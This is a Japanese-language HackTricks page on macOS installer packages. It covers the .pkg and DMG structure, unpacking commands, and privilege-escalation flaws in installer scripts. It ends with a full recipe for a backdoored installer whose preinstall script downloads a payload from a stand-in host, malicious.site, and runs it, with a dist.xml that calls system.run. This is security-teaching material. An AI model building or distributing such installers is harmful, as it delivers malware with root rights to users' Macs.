# macOS インストーラーの悪用

{{#include ../../../banners/hacktricks-training.md}}

## Pkg 基本情報

macOS **インストーラーパッケージ**（.pkgファイルとも呼ばれる）は、macOSが**ソフトウェアを配布するために使用するファイル形式**です。これらのファイルは、ソフトウェアが正しくインストールおよび実行するために必要なすべてを含む**箱のようなもの**です。

パッケージファイル自体は、ターゲットコンピュータにインストールされる**ファイルとディレクトリの階層を保持するアーカイブ**です。また、インストール前後にタスクを実行するための**スクリプト**を含むこともでき、設定ファイルのセットアップやソフトウェアの古いバージョンのクリーンアップなどを行います。

### 階層

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: カスタマイズ（タイトル、ウェルカムテキスト…）およびスクリプト/インストールチェック
- **PackageInfo (xml)**: 情報、インストール要件、インストール場所、実行するスクリプトへのパス
- **Bill of materials (bom)**: インストール、更新、または削除するファイルのリストとファイル権限
- **Payload (CPIOアーカイブgzip圧縮)**: PackageInfoから`install-location`にインストールするファイル
- **Scripts (CPIOアーカイブgzip圧縮)**: インストール前後のスクリプトおよび実行のために一時ディレクトリに抽出されたその他のリソース

### 解凍
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
インストーラーの内容を手動で解凍せずに視覚化するために、無料ツール[**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/)を使用することもできます。

## DMG基本情報

DMGファイル、またはAppleディスクイメージは、AppleのmacOSでディスクイメージに使用されるファイル形式です。DMGファイルは本質的に**マウント可能なディスクイメージ**（独自のファイルシステムを含む）であり、通常は圧縮され、時には暗号化された生のブロックデータを含んでいます。DMGファイルを開くと、macOSはそれを**物理ディスクのようにマウント**し、その内容にアクセスできるようにします。

> [!CAUTION]
> **`.dmg`**インストーラーは**非常に多くの形式**をサポートしているため、過去には脆弱性を含むものが悪用されて**カーネルコード実行**を取得されることがありました。

### 階層

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMGファイルの階層は、内容に基づいて異なる場合があります。ただし、アプリケーションDMGの場合、通常は次の構造に従います：

- トップレベル：これはディスクイメージのルートです。通常、アプリケーションと、場合によってはアプリケーションフォルダへのリンクが含まれています。
- アプリケーション（.app）：これは実際のアプリケーションです。macOSでは、アプリケーションは通常、アプリケーションを構成する多くの個別のファイルとフォルダを含むパッケージです。
- アプリケーションリンク：これはmacOSのアプリケーションフォルダへのショートカットです。これにより、アプリケーションを簡単にインストールできるようになります。このショートカットに.appファイルをドラッグすることで、アプリをインストールできます。

## pkg悪用による特権昇格

### 公共ディレクトリからの実行

例えば、事前または事後インストールスクリプトが**`/var/tmp/Installerutil`**から実行されている場合、攻撃者はそのスクリプトを制御できるため、実行されるたびに特権を昇格させることができます。別の類似の例：

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

これは、いくつかのインストーラーやアップデーターが**rootとして何かを実行するために呼び出す**[公開関数](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)です。この関数は、**実行する**ための**ファイルの** **パス**をパラメータとして受け取りますが、攻撃者がこのファイルを**変更**できる場合、彼は**特権を昇格させるために**rootでの実行を**悪用**できるようになります。
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### マウントによる実行

インストーラーが `/tmp/fixedname/bla/bla` に書き込む場合、所有者なしで `/tmp/fixedname` 上に **マウントを作成** することが可能で、インストール中に **任意のファイルを変更** してインストールプロセスを悪用できます。

これの例が **CVE-2021-26089** で、これにより **定期的なスクリプトを上書き** して root として実行することができました。詳細については、こちらのトークを参照してください: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkgをマルウェアとして

### 空のペイロード

実際のペイロードはなく、スクリプト内のマルウェアを除いて、**プレインストールおよびポストインストールスクリプト**を持つ **`.pkg`** ファイルを生成することが可能です。

### 配布xml内のJS

パッケージの **distribution xml** ファイルに **`<script>`** タグを追加することが可能で、そのコードは実行され、**`system.run`** を使用して **コマンドを実行** できます：

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

### バックドア付きインストーラー

dist.xml内にスクリプトとJSコードを使用した悪意のあるインストーラー
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## 参考文献

- [**DEF CON 27 - Pkgsの展開 macOSインストーラーパッケージと一般的なセキュリティの欠陥の内部を見てみる**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "macOSインストーラーのワイルドな世界" - トニー・ランバート**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Pkgsの展開 macOSインストーラーパッケージの内部を見てみる**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)

{{#include ../../../banners/hacktricks-training.md}}
